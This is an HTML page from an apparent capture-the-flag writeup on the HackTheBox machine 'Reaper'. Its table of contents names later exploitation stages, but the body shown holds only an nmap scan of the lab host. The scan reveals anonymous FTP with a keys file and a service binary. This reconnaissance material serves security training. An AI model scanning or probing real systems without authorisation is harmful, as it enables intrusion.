<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://syanide-.github.io/writeups/writeups/HackTheBox/Machines/Reaper/">
      
      
        <link rel="prev" href="../Rainbow/">
      
      
        <link rel="next" href="../Redelegate/">
      
      
        
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>Reaper - SYANiDE-.github.io writeups</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../css/app.css">
    
      <link rel="stylesheet" href="../../../../css/terminal-player.css">
    
      <link rel="stylesheet" href="../../../../css/asciinema-player.css">
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/panzoom.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style><meta name="panzoom-theme" content="material">
<meta name="panzoom-data" content='{"selectors": [".mermaid", ".d2"], "initial_zoom_level": 1.0}'> </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="deep-orange">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#enumeration" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="SYANiDE-.github.io writeups" class="md-header__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SYANiDE-.github.io writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Reaper
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="deep-orange" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9z"></path></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-orange" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5"></path></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../.." class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../blog/" class="md-tabs__link">
          
  
  
    
  
  Blog

        </a>
      </li>
    
  

      
        
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../Breach/" class="md-tabs__link">
          
  
  
    
  
  Writeups

        </a>
      </li>
    
  

    
  

    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="SYANiDE-.github.io writeups" class="md-nav__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    SYANiDE-.github.io writeups
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../../../blog/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    Blog
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
        
        
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Writeups
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Writeups
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    HackTheBox
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    HackTheBox
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Machines
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Machines
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Breach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Breach
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Rainbow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Rainbow
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Reaper
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Reaper
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumeration
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ghidra-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ghidra analysis
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Ghidra analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#common_main_seh" class="md-nav__link">
    <span class="md-ellipsis">
      
        common_main_seh()
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bind_server" class="md-nav__link">
    <span class="md-ellipsis">
      
        bind_server()
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bind_client" class="md-nav__link">
    <span class="md-ellipsis">
      
        bind_client()
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#case_exec" class="md-nav__link">
    <span class="md-ellipsis">
      
        case_exec
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Dynamic Analysis
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fuzzing-for-a-controllable-crash" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fuzzing for a controllable crash
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#triangulating-a-pattern" class="md-nav__link">
    <span class="md-ellipsis">
      
        Triangulating a pattern
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#controlling-seh" class="md-nav__link">
    <span class="md-ellipsis">
      
        Controlling SEH
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#identifying-bad-characters" class="md-nav__link">
    <span class="md-ellipsis">
      
        Identifying bad characters
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#easy-so-far-whats-the-catch" class="md-nav__link">
    <span class="md-ellipsis">
      
        Easy so far, what's the catch?
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Easy so far, what's the catch?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#rdi-pattern-and-offset" class="md-nav__link">
    <span class="md-ellipsis">
      
        RDI pattern and offset
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#time-for-another-plan" class="md-nav__link">
    <span class="md-ellipsis">
      
        Time for another plan
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-ropgadgets" class="md-nav__link">
    <span class="md-ellipsis">
      
        Finding ROPgadgets
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ropchaining" class="md-nav__link">
    <span class="md-ellipsis">
      
        ROPchaining
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#final-ropchain" class="md-nav__link">
    <span class="md-ellipsis">
      
        Final ROPchain
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#getting-the-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Getting the shell
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#poc" class="md-nav__link">
    <span class="md-ellipsis">
      
        PoC
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Post-exploitation enumeration
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#analyzing-reapersys" class="md-nav__link">
    <span class="md-ellipsis">
      
        Analyzing Reaper.sys
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Analyzing Reaper.sys">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interacting-with-a-kernel-module" class="md-nav__link">
    <span class="md-ellipsis">
      
        Interacting with a kernel module
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crash-course-in-kernel-driver-development-and-debugging" class="md-nav__link">
    <span class="md-ellipsis">
      
        Crash course in kernel driver development and debugging
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#building-the-poc" class="md-nav__link">
    <span class="md-ellipsis">
      
        Building the PoC
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-the-shell_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Getting the shell
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Redelegate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Redelegate
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="Navigation">
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../../../.." class="md-path__link">
        
  <span class="md-ellipsis">
    About
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      
  
  
    
    
      
  
  
    
    
      <li class="md-path__item">
        <a href="../Breach/" class="md-path__link">
          
  <span class="md-ellipsis">
    Writeups
  </span>

        </a>
      </li>
    
  

    
  

    
  

      
        
  
  
    
    
      
  
  
    
    
      <li class="md-path__item">
        <a href="../Breach/" class="md-path__link">
          
  <span class="md-ellipsis">
    HackTheBox
  </span>

        </a>
      </li>
    
  

    
  

      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../Breach/" class="md-path__link">
          
  <span class="md-ellipsis">
    Machines
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Reaper</h1>

<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251031132749.png" data-desc-position="bottom"><img alt="Pasted_image_20251031132749.png" src="../../../../Pasted_image_20251031132749.png"></a></p>
<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">¶</a></h2>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
└─$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.234.200
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-31<span class="w"> </span><span class="m">13</span>:25<span class="w"> </span>PDT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.234.200
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.17s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">997</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp<span class="w">           </span>Microsoft<span class="w"> </span>ftpd
<span class="p">|</span><span class="w"> </span>ftp-syst:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>SYST:<span class="w"> </span>Windows_NT
<span class="p">|</span><span class="w"> </span>ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span>
<span class="p">|</span><span class="w"> </span><span class="m">08</span>-15-23<span class="w">  </span><span class="m">12</span>:12AM<span class="w">                  </span><span class="m">262</span><span class="w"> </span>dev_keys.txt
<span class="p">|</span>_08-14-23<span class="w">  </span><span class="m">02</span>:53PM<span class="w">               </span><span class="m">187392</span><span class="w"> </span>dev_keysvc.exe
<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
<span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows
<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>REAPER
<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>REAPER
<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>REAPER
<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>reaper
<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>reaper
<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.19041
<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-10-31T20:26:47+00:00
<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-31T20:26:51+00:00<span class="p">;</span><span class="w"> </span>-4s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>reaper
<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-10-30T20:18:22
<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-05-01T20:18:22
Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose
Running<span class="w"> </span><span class="o">(</span>JUST<span class="w"> </span>GUESSING<span class="o">)</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="p">|</span><span class="m">2019</span><span class="w"> </span><span class="o">(</span><span class="m">97</span>%<span class="o">)</span>
OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_10<span class="w"> </span>cpe:/o:microsoft:windows_server_2019
Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">1903</span><span class="w"> </span>-<span class="w"> </span>21H1<span class="w"> </span><span class="o">(</span><span class="m">97</span>%<span class="o">)</span>,<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">1803</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>
No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows

Host<span class="w"> </span>script<span class="w"> </span>results:
<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>-4s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>-4s

TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span>/tcp<span class="o">)</span>
HOP<span class="w"> </span>RTT<span class="w">       </span>ADDRESS
<span class="m">1</span><span class="w">   </span><span class="m">198</span>.18<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.16.1
<span class="m">2</span><span class="w">   </span><span class="m">198</span>.32<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.129.234.200

OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
